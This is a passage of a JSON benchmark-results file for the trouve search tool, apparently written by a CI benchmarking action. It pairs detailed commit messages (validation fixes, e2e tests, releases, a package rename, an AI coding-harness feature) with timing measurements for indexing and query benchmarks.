          "message": "Validate model artifacts at load time; never panic on tokenizer failure (#20)\n\n* Validate model artifacts at load time; never panic on tokenizer failure\n\npool_into slices the embedding table without bounds checks, trusting\nthat every token id resolves to a valid row. That held for intact\nmodel files but a corrupt or mismatched model.safetensors (truncated\ndownload, wrong mapping tensor) would panic mid-index. Validate at\nload instead, keeping the pooling hot path branch-free:\n\n- decode_mapping rejects negative or out-of-range entries (negative\n  i64s previously wrapped to huge u32 row indexes);\n- the vocabulary size must be covered by the mapping tensor (when\n  present) or fit the embedding table (when absent).\n\nThe HF tokenizer fallback path used .expect(\"tokenization failed\"),\nturning any tokenizer error into a process abort — during an index\nbuild that is one bad text killing the whole run. Failed texts now\nembed as the zero vector (BM25 still covers them) with a one-time\nwarning on stderr.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Validate token ids against the highest assigned id, not the vocab count\n\nReview feedback: get_vocab_size(true) counts tokens, but token id\nassignments can have gaps, so an id can exceed the count and still\nindex past the mapping/table with the count-based check. Compute the\nid space as max assigned id + 1 from get_vocab(true) and validate\nmapping length / table rows against that, which bounds every id the\ntokenizer can emit. Verified the real potion-code-16M model still\nloads and passes embed parity.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T22:38:17-04:00",
          "tree_id": "e9a091cf98a813f99c072b829a55f049c4fead77",
          "url": "https://github.com/jimsimon/trouve/commit/5ba3b9f376a370459e2cfc5e034ebb384b86c0ce"
        },
        "date": 1783132884695,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 133.36848682000002,
            "range": "± 4.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 68.89396319999999,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 79.87280942,
            "range": "± 1.4",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 66.10110054000002,
            "range": "± 1.6",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "291d6705cbc26b4d31337f01d17634929c9492c2",
          "message": "Add the model-backed e2e tests that README and CI already promised (#21)\n\n* Add the model-backed e2e tests that README and CI already promised\n\nREADME documents 'TROUVE_E2E=1 cargo test -- --ignored' as the way to\nrun end-to-end tests that download the model, and test.yml has a\ntest-with-model job running exactly that — but there was not a single\n#[ignore] test in the repo and TROUVE_E2E was never read. The CI job\nexecuted zero tests and passed green.\n\nAdd tests/e2e.rs with two ignored tests gated on TROUVE_E2E:\n\n- index a small fixture project with the real default model\n  (potion-code-16M downloaded from the Hugging Face Hub) and verify\n  semantic and identifier queries rank the right files first, plus\n  find_related excludes the seed;\n- a warm rebuild recomputes nothing and returns identical results.\n\nWithout TROUVE_E2E=1 they skip themselves so a plain\n'cargo test -- --ignored' stays offline-safe. Verified locally: both\ntests pass against the downloaded model, and the skip path passes\noffline.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Address e2e review feedback: strict gate, stale-cache sweep, top-k assertions\n\n- TROUVE_E2E now requires the documented value 1, so TROUVE_E2E=0 (or\n  false) skips instead of downloading the model.\n- The per-run cache dir must stay isolated (tests assert cold-build\n  stats), but previous runs' dirs are now swept at init so repeated\n  local runs no longer accumulate trouve-e2e-cache-* garbage.\n- Ranking assertions check the expected file appears in the top\n  results instead of pinning exact top-1: this suite is a pipeline\n  sanity gate, exact ranking is covered by the parity/quality\n  harnesses, and a model bump or platform float difference must not\n  flake CI. Verified against the real downloaded model.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Only sweep e2e cache dirs untouched for an hour\n\nReview feedback: the unconditional sweep could remove_dir_all the\nstill-in-use cache of a concurrent e2e run in another process,\ncorrupting its in-flight cold-build assertions. Age-gate the sweep to\ndirs whose mtime is over an hour old — a run takes seconds, so a\nconcurrent process's dir is always fresh while genuinely stale dirs\nfrom earlier runs are still cleaned up. Verified: a 2-hour-old dir is\nremoved, a fresh one survives, and the model-backed tests pass.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T23:17:38-04:00",
          "tree_id": "7ea0b1f760e71df97f40163ac7c679051d1f7f45",
          "url": "https://github.com/jimsimon/trouve/commit/291d6705cbc26b4d31337f01d17634929c9492c2"
        },
        "date": 1783135133192,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 131.63367286000002,
            "range": "± 3.3",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 68.42449022,
            "range": "± 2.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 78.67759296,
            "range": "± 2.1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 65.8175857,
            "range": "± 1.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "2bfc1f89ce58e42da0e62533501c57743064622c",
          "message": "Prepare the v1.1.0 release (#24)\n\n* Prepare the v1.0.1 release\n\nBump the crate version to 1.0.1 (Cargo.toml, Cargo.lock) and sync the\nplugin manifests via scripts/sync_versions.py. Promote the Unreleased\nchangelog section to 1.0.1 dated 2026-07-04, and add the entries that\nhad not been recorded yet: the model-backed e2e test suite (#21) under\nAdded, and a Fixed section covering .trouveignore in git repos (#15),\nMCP protocol violations (#18), git manifest symlink/conflict handling\n(#17), snapshot compatibility checks (#16), model-loading validation\n(#20), and cache statistics (#19).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Retarget the release as v1.1.0\n\nThe release adds features (clone cache, new grammars, plugins) and\nraises the MSRV, so a minor bump fits SemVer better than a patch.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T23:32:52-04:00",
          "tree_id": "ed8f6317b00d2d2ec8023117dfad99d840f0ed26",
          "url": "https://github.com/jimsimon/trouve/commit/2bfc1f89ce58e42da0e62533501c57743064622c"
        },
        "date": 1783136054839,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 123.74730056000001,
            "range": "± 8",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 65.03083751999999,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 75.82692062,
            "range": "± 1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 63.78238518000001,
            "range": "± 1.5",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c91ecc6c314d8864b51eae3288c873ebf258d20e",
          "message": "Update Rust crate hf-hub to 0.5 (#26)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-03T23:42:17-04:00",
          "tree_id": "f63dbcac5c01411c09859252cc50bdca7724b877",
          "url": "https://github.com/jimsimon/trouve/commit/c91ecc6c314d8864b51eae3288c873ebf258d20e"
        },
        "date": 1783136627393,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 128.52630710000003,
            "range": "± 15",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 66.30452222000001,
            "range": "± 1.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 78.49268978,
            "range": "± 2.1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 67.7114693,
            "range": "± 3.2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "732babd59237621444c19108343716d1ede8116f",
          "message": "Fix Renovate lookup for github-action-benchmark pin (#28)\n\nRenovate resolves the version of a digest-pinned action from the trailing\ncomment. benchmark-action/github-action-benchmark has no 'v1' tag (only a\nv1 branch), so the '# v1' comment made the github-tags lookup fail with\n'Could not determine new digest for update'. Point the comment at the\nreal tag, v1.22.1, which matches the pinned SHA.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T23:42:56-04:00",
          "tree_id": "57fcaf9d897395b67d7642c212218d9889db4dc8",
          "url": "https://github.com/jimsimon/trouve/commit/732babd59237621444c19108343716d1ede8116f"
        },
        "date": 1783136760914,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 124.04259848000001,
            "range": "± 9.2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 68.72900166000001,
            "range": "± 1.1",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 82.52808608000001,
            "range": "± 0.8",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 64.59236098000001,
            "range": "± 2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "7004a2a98053e8320d523b48200e278e8ff39370",
          "message": "Update GitHub Actions (#32)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-04T19:26:34-04:00",
          "tree_id": "bba5eb324419f0128078061d0e8f75a54e3ffe48",
          "url": "https://github.com/jimsimon/trouve/commit/7004a2a98053e8320d523b48200e278e8ff39370"
        },
        "date": 1783207672064,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 128.34505474,
            "range": "± 6.7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 65.6720786,
            "range": "± 2.5",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 75.51961360000001,
            "range": "± 1.5",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 62.901922080000006,
            "range": "± 1.2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "53517d96037f6214813ebc5d12c2fa694b717dc2",
          "message": "Update Rust crate safetensors to 0.8 (#29)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-04T19:27:12-04:00",
          "tree_id": "da51fbf85cc8e5598253114f075640587c026113",
          "url": "https://github.com/jimsimon/trouve/commit/53517d96037f6214813ebc5d12c2fa694b717dc2"
        },
        "date": 1783207801712,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 128.4568336,
            "range": "± 15.2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 67.83514738,
            "range": "± 1.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 78.40674848,
            "range": "± 1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 67.10799932,
            "range": "± 1.6",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "ec59273899b07e063644005c7ba750af9eafd00a",
          "message": "Rename to trouve-search and ship npm packages under @trouve-ai (#34)\n\n* Rename to trouve-search and ship npm packages under @trouve-ai\n\nThe crate and CLI binary become trouve-search, reserving the bare\ntrouve name for future products. npm distribution moves to an npm\nworkspace under npm/: @trouve-ai/search-core ships the native binary\nvia per-platform optional dependencies plus a Node MCP launcher\n(npx -y @trouve-ai/search-core), and @trouve-ai/search-plugin replaces\ntrouve-plugin, absorbing the Claude/Codex bundle from plugins/trouve.\nRelease and lint workflows, version syncing, and agent docs updated to\nmatch.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Harden release workflow per review: no persisted credentials, npm provenance\n\nDisable persist-credentials on the build and publish-crate checkouts to\nmatch the other jobs, and publish npm packages with --provenance (the\npublish-npm job gets id-token: write for the OIDC-signed attestation).\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Run cargo publish verification before uploading to crates.io\n\nRemove --no-verify so the release workflow builds the crate in Cargo's\nisolated package mode before publishing.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Pass the release tag to packaging steps via env\n\nInterpolating github.ref_name directly into the run scripts exposes\ntar/Compress-Archive to tag-name injection; route it through REF_NAME.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Address PR review feedback\n\n- Rename remaining \"trouve\" diagnostics to \"trouve-search\" in the\n  OpenCode tool file and the plugin's server/error messages.\n- platform.js: fail fast on unsupported CPU architectures instead of\n  silently falling back to x64.\n- stage_npm_binaries.py: report missing archive members with the\n  member list instead of an uncaught KeyError.\n- release.yml: pass github.ref_name through env in the package steps\n  to avoid shell template injection via tag names.\n- lint.yml: pin Node and cache the npm workspace via setup-node.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Pin actions/setup-node to a commit SHA\n\nPin the two setup-node uses to the v6.4.0 commit with a version\ncomment; Renovate's github-actions manager keeps SHA pins updated.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-05T14:58:52-04:00",
          "tree_id": "3bea8e2df0a49d1f2f54b62888105c53c40517af",
          "url": "https://github.com/jimsimon/trouve/commit/ec59273899b07e063644005c7ba750af9eafd00a"
        },
        "date": 1783278013188,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 125.74607204000002,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 65.18940891999999,
            "range": "± 1.5",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 77.63747742000001,
            "range": "± 1.1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 62.87806214000001,
            "range": "± 1.1",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "5d92f0950f3b6d01649db5bb135a8129bbad90ce",
          "message": "Add NAME.md explaining the trouve name (#35)\n\n* Add NAME.md documenting the trouve name and its significance\n\nExplains the nod to upstream semble, the literal fit for the search\ntool, and why the find/create etymology of \"trouver\" suits an AI\numbrella brand; README already links to it.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Note deprecated SEMBLE_*/.sembleignore fallbacks in NAME.md\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n---------\n\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-05T15:28:23-04:00",
          "tree_id": "7c7554cd8887c34f3c69ce5e779d14fdb481495b",
          "url": "https://github.com/jimsimon/trouve/commit/5d92f0950f3b6d01649db5bb135a8129bbad90ce"
        },
        "date": 1783279788868,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 124.53375626000002,
            "range": "± 8",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 65.36098528000001,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 75.11357228,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 64.6292997,
            "range": "± 2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "52a77f702d6b42e51ebbbad09f3b797e6872d1e6",
          "message": "Prepare the v2.0.0 release (#37)\n\nBump the crate version to 2.0.0 (Cargo.toml, Cargo.lock) and sync the\nnpm workspace and plugin manifests via scripts/sync_versions.py.\nPromote the Unreleased changelog section to 2.0.0 dated 2026-07-05 —\na major bump because the crate/binary rename to trouve-search and the\nmove to @trouve-ai npm packages break existing installs and MCP\nconfigs — and record the entries not yet captured: NAME.md and the\nhf-hub/tokenizers/safetensors dependency updates.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>",
          "timestamp": "2026-07-05T19:37:07-04:00",
          "tree_id": "80d8fef5fef5cedcf0eb7d60a32e01ea0d5ad0ef",
          "url": "https://github.com/jimsimon/trouve/commit/52a77f702d6b42e51ebbbad09f3b797e6872d1e6"
        },
        "date": 1783294699968,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 123.55365230000001,
            "range": "± 8.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 66.86768992,
            "range": "± 1.4",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 77.5731818,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 65.08919156,
            "range": "± 1.4",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "43a1a7144d9c6fd55da4a6274f970522c74a4106",
          "message": "Add the trouve AI coding harness (#50)\n\n* Convert to a Cargo workspace and add the trouve coding harness\n\nMove trouve-search from the repo root into crates/trouve-search and add\nthe harness crates around it: trouve-protocol (versioned OpenAPI/SSE\nprotocol), trouve-core (engine, event-sourced store, git worktrees,\nmodes, permission gating, native tools), trouve-providers (OpenAI-compat\nand Anthropic providers, auth, secrets, model catalog), trouve-agents\n(Codex app-server, Cursor CLI, and Claude Code CLI backends with an MCP\nbridge for tools and permission prompts), trouve-server (HTTP/SSE API),\ntrouve-cli (auth, serve, mcp-bridge), trouve-client-core, the Slint\ndesktop app, and the slint-* widget crates.\n\ntrouve-search is embedded in-process as native search/find_related\ntools sharing one index cache; sessions warm the index on creation and\nsweep the shared store on archive/delete. Workflows, version-sync\nscripts, and npm manifests are adjusted for the workspace layout.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Expose native search to vendor agents and steer them to it\n\nClaude Code never saw trouve's semantic search: the MCP bridge only\nserved tools with full tool bridging enabled, and vendor agents prefer\ntheir built-in find/grep even when a better tool is listed. The bridge\nnow always serves the read-only search/find_related pair (executed\nin-process by the engine's ToolExecutor; the bridge is just transport),\nthe Claude adapter pre-allows them in approvals-only mode, and bridged\nturns append explicit system-prompt guidance — exact mcp__trouve__*\ntool names plus a prohibition on Bash find/grep discovery — adapted\nfrom trouve-search's agent plugin docs.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Render chat markdown with inline styling and command-aware tool titles\n\nAssistant text rendered raw markdown markers (**bold**, `code`) because\nthe block renderer intentionally skips inline styling. Non-code blocks\nnow go through Slint 1.17's StyledText (headings keep their size scale,\nbullets their glyph, code fences stay plain monospace), with markdown\nlinks opening in the system browser, restricted to http(s). Shell-style\ntool cards title themselves with the command they ran — \"Bash (wc -l\nfoo.rs)\" — instead of a bare tool name.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* List backend models dynamically from the vendor CLIs\n\nThe model picker showed a stale hardcoded snapshot: retired models\n(composer-1), models from backends that aren't logged in (codex), and\nnone of the newer catalog (Fable, Opus 4.8, thinking/MAX/fast\nvariants). AgentBackend now has an async list_models that asks the\nvendor — `cursor-agent models` parsed from its listing output, Codex\nvia model/list on the app-server with reasoning efforts expanded into\n`model@effort` variants that turn/start passes through — cached for\nfive minutes, falling back to a minimal static list offline. The\nengine skips backends that aren't installed and authenticated, since\ntheir models can't run anyway. Claude Code has no listing command and\nkeeps its sonnet/opus/haiku aliases, which the vendor maps to the\nnewest models on the plan.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Host the new-thread form in a provisional tab\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Stream thinking blocks and clean up turn status rendering\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Trust the session worktree on headless cursor-agent runs\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Drop remote git-URL cloning from trouve-search\n\nManaging clones of other people's repositories — credentials, freshness,\neviction, concurrent access — is out of scope for a search tool. The CLI,\nMCP server, native tool, and library now reject git URLs; clone the repo\nyourself and pass the local path.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add schema-driven model options and richer markdown rendering\n\nModels now declare their knobs (thinking level, fast mode, max-mode\nsurcharge) in an options schema so the composer can render them\ngenerically, with per-thread selections stored on the thread and passed\nthrough to backends; the Anthropic catalog is fetched live and shared\nbetween the API provider and the Claude CLI. Chat markdown gains ordered\nlists, nesting, correct fence handling, and set-off code styling.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Make chat text selectable with copy buttons and a raw-text view\n\nSlint's StyledText can't be selected, so plain-text surfaces (user\nmessages, code fences, tool detail, thinking) become read-only text\ninputs, copy buttons cover code blocks, messages, tool cards, whole\nresponses, diffs, and files, and each completed turn gains a\n\"select text\" toggle that swaps styled markdown for one fully\nselectable plain-text block.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Give prompt inputs multiline editing with Enter-to-send\n\nThe composer and new-chat message fields become a shared PromptBox:\na growing multi-line input (Shift+Enter for newlines, scrolls past\n~8 lines) with the composer's pickers and knobs moved to their own\nrow below the input.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Keep scroll position on chat toggles and make Styled a real toggle\n\nScroll-to-end is now opt-in per render, so expanding tool details or\nswitching a turn's view no longer jumps the list; the raw-view link\nbecomes a \"Styled\" toggle pill, on by default.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Nest turn output in collapsible cards with live thinking and highlighting\n\nChat items now fold into per-source cards: prompts, agent responses\n(absorbing their tool calls and thinking blocks in stream order, with\ngrouped tool runs), and a synthesized Agent wrapper while a turn opens\nwith tools/thinking before any text. Claude Code streams text and\nthinking live (--include-partial-messages, --thinking-display\nsummarized), bridged approvals attach to the vendor's existing tool\ncard instead of duplicating it, chat model updates diff in place so\ntoggles no longer jump the scroll position, code fences get syntect\nhighlighting, prompts and thinking render markdown, and the prompt\ninput grows a scrollbar once it stops expanding.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Title Read tool cards with a clickable filename and collapsible details\n\nRead-style tools (Read / read / read_file) now header as \"Read <basename>\",\nand clicking the filename opens the file in the Files tab via a new\nchat-file-opened callback that resolves worktree-relative paths. Tool\ncards drop the \"details\" link in favor of a disclosure arrow with the\nwhole header clickable, matching the other collapsible cards.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Fix session delete FK failure and hide archived sessions behind a filter\n\nDeleting a session whose thread had run a turn hit a FOREIGN KEY\nconstraint because backend_sessions rows were never cleared; the delete\ncascade now covers them and runs in one transaction (with foreign_keys\nenabled in the in-memory store so tests catch this). The left nav gains\na funnel button beside \"+\" with an Archived filter, hidden by default.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Collapse earlier turns' thinking blocks once the next prompt is sent\n\nThinking pills stay expanded while their turn is the latest, then\ndefault to collapsed when a newer turn exists — the reader has moved\non. The manual toggle flips whichever default applies.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add a rendered-markdown preview toggle to the file viewer\n\nMarkdown files get an eye button in the file header that swaps the\nhighlighted source for rendered blocks, reusing the chat's markdown\nrow pipeline so both surfaces render identically.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Give model pickers a fuzzy-search box\n\nBoth model selectors (composer drop-up and new-chat dropdown) become a\nSearchPicker with a focused search field; fuzzy filtering runs in Rust\nvia fuzzy-matcher (skim scoring, best match first) and Enter picks the\ntop hit.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Humanize tool call details instead of dumping raw JSON\n\nArgs and results render as indented key: value text with multiline\nstrings as blocks, nulls/empties dropped, and a result divider;\nClaude/MCP text-block results unwrap to their plain text.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Persist and restore window geometry across launches\n\nPosition, size, and maximized state save to the config dir as they\nchange (polled; Slint lacks move/resize callbacks) and restore on\nlaunch, falling back to defaults when the file is absent or implausible.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Reopen the last session, thread, and scroll position on launch\n\nThe shell polls a resume bookmark (session/thread ids from the\ncontroller plus the live chat scroll offset) into resume.json and the\ncontroller restores it at bootstrap, falling back to the most recent\nactive session when the saved ids no longer exist.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Confirm before quitting while agent turns are running\n\nWindow close with active turns opens a modal offering Quit, Quit when\nagents finish (defers until the running count the controller tracks\nhits zero), or Cancel, instead of silently tearing down mid-run.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Unblock read-only search and humanize tool and mode labels\n\nRead-only turns drop Claude's plan mode (its interactive plan-workflow\nprompt misfires headless and blocked the bridged code search); mutations\nare denied through the trouve approval gate instead, with definite\nmutators disallowed outright. Bridged trouve tools now report their real\nmutability so read-only search passes. ENABLE_TOOL_SEARCH is off since\nthe bridge exposes few tools, removing the ToolSearch round-trip. Tool\ncards show human names (Code Search/Tool Search/Web Search + query) and\nmode pickers/tabs show capitalized display names.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Bookmark the last open thread and scroll per session\n\nresume.json now stores the last open session plus per-session last\nthread and per-thread scroll maps, owned by the controller instead of\npolled UI properties. Clicking a session reopens its last thread, and\nopening a thread restores its saved scroll offset. The shell's poll\njust forwards scroll changes; deleted sessions drop their bookmarks.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Remove the Max Mode concept\n\nCursor retired Max Mode, so the ModelInfo flag, the composer's\n\"Max · +20%\" badge, and all the plumbing between them go away. The\n\"1M\" display-name check stays only to infer the context window.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Manage vendor CLI installs and move Cursor to ACP\n\nSettings gains a Vendor CLIs section that downloads official cursor-agent,\nClaude Code, and Codex builds into trouve's data dir (managed installs beat\nPATH). The Cursor backend now speaks the Agent Client Protocol: real model\nmetadata with per-model thinking/context/effort/fast knobs, interactive\napprovals bridged through trouve's permission layer, and plan mode for\nread-only turns.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Group agent activity and enrich tool cards\n\nConsecutive tool calls and thinking blocks fold under one summarized\nheader (\"Edited 2 files, read 3 files, thought 1 time\") while narration\nalways stays at the card's top level. Thinking pills match tool-card\nstyling and flip to \"Thought\" when done. Edit tools show a clickable\nfilename, +/− line counts, and an inline red/green diff; reads show the\nline range and preselect it in the file view on click. Agent headers name\nthe model that ran the turn.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Pin the chat to its tail while streaming\n\nScroll-to-end ran before the ListView re-measured freshly grown rows, so\nthe activity spinner could sit below the fold until the next event. A\nfollow flag now re-clamps the viewport on every content-height change;\nin-place re-renders and restored scroll bookmarks clear it.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Let the right panel grow at the chat's expense\n\nThe Diff/Files splitter was hard-capped at 800px; its max now tracks the\nwindow, leaving only a 340px chat floor. Window or left-column resizes\nre-clamp the panel imperatively (a width binding would loop the layout).\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Answer cursor/create_plan so plan mode stops hanging\n\ncursor-agent submits the finished plan as a session-less JSON-RPC\nrequest and blocks the turn on the response; the adapter never\nanswered it, so plan-mode turns spun forever. Ack it in the reader,\nstash the plan content, and attach it as the plan tool call's result.\nUnroutable server requests now get a method-not-supported error\ninstead of silence, and \"other\" tool calls surface their real name\nfrom rawInput._toolName. Also retry ETXTBSY stub spawns in the\nadapter tests to fix a pre-existing parallel-test flake.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add an interactive question wizard for agent questions\n\nAgents can now defer to the user mid-turn with structured questions\n(single/multi choice, an Other free-form, wizard paging with back/review\nbefore submit). The engine serves an ungated ask_question tool to native\nprovider turns, the MCP bridge carries it to 